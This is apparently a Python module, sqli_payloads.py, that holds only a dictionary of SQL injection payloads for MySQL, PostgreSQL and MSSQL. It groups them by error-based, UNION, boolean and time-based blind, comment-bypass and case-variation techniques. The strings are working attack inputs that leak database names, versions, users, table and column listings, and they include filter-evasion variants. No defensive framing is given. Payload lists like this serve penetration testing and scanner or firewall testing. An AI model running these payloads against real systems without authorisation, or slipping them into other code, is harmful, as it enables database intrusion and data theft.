# sqli_payloads.py

# Payloads for different database types and injection types
SQLI_PAYLOADS = {
    "mysql": {
        "error": [
            "' AND extractvalue(1,concat(0x7e,database()))-- -",
            "' AND updatexml(1,concat(0x7e,user()),1)-- -",
            "' AND (select * from (select+name_const(version(),1))a)-- -"
        ],
        "union": [
            "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -"
        ],
        "blind_boolean": [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND ascii(substring(database(),1,1)) > 100-- -"
        ],
        "blind_time": [
            "' AND SLEEP(5)-- -",
            "' AND BENCHMARK(5000000,MD5(1))-- -"
        ],
        "comment_bypass": [
            "' UNION SELECT 1,2,3#",
            "' UNION SELECT 1,2,3 /*!*/",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -"
        ],
        "case_variation": [
            "' UnIoN SeLeCt 1,2,3-- -",
            "' aNd '1'='1",
            "' Or '1'='1'-- -"
        ]
    },
    "postgresql": {
        "error": [
            "' AND 1=CAST((SELECT version()) AS INT)-- -",
            "' AND 1=CAST((SELECT current_database()) AS INT)-- -"
        ],
        "union": [
            "' UNION SELECT NULL,version(),NULL-- -",
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -"
        ],
        "blind_boolean": [
            "' AND '1'='1'::text",
            "' AND (SELECT current_database()) LIKE 'a%'-- -"
        ],
        "blind_time": [
            "' AND pg_sleep(5)-- -"
        ],
        "comment_bypass": [
            "' UNION SELECT NULL,version(),NULL-- -",
            "' /*+*/ UNION SELECT NULL,version(),NULL-- -"
        ],
        "case_variation": [
            "' UnIoN SeLeCt NULL,version(),NULL-- -"
        ]
    },
    "mssql": {
        "error": [
            "' AND 1=CONVERT(int, @@version)-- -",
            "' AND 1=CONVERT(int, (SELECT db_name()))-- -"
        ],
        "union": [
            "' UNION SELECT NULL,@@version,NULL-- -",
            "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -"
        ],
        "blind_boolean": [
            "' AND '1'='1",
            "' AND (SELECT @@version) LIKE 'M%'-- -"
        ],
        "blind_time": [
            "' WAITFOR DELAY '0:0:5'-- -"
        ],
        "comment_bypass": [
            "' UNION SELECT NULL,@@version,NULL-- -",
            "' ; WAITFOR DELAY '0:0:5'-- -"
        ],
        "case_variation": [
            "' UnIoN SeLeCt NULL,@@version,NULL-- -"
        ]
    }
}